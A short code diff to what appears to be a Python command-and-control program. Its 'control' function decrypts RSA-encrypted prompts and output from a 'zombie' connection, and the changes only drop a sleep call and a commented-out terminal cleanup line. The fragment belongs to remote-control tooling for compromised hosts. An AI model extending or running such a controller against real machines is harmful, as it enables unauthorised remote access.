@@ -54,7 +54,6 @@ def listen(host, port):
 def control(zombie, zombiepubkey):
 
 	try:
-		time.sleep(1)
 		while True:	
 			prompt = rsa.decrypt(zombie.recv(5024), private_key).decode()	
 			sys.stdout.write(prompt)
@@ -69,8 +68,6 @@ def control(zombie, zombiepubkey):
 			
 			cmd = rsa.decrypt(zombie.recv(5024), private_key).decode()
 			sys.stdout.write(cmd)
-				
-	#		sys.stdout.write("\033[A"+cmd.split("\n")[-1])		#Removes duplicate command from stdout
 			
 	except Exception as e:
 		print("Error: " + str(e))
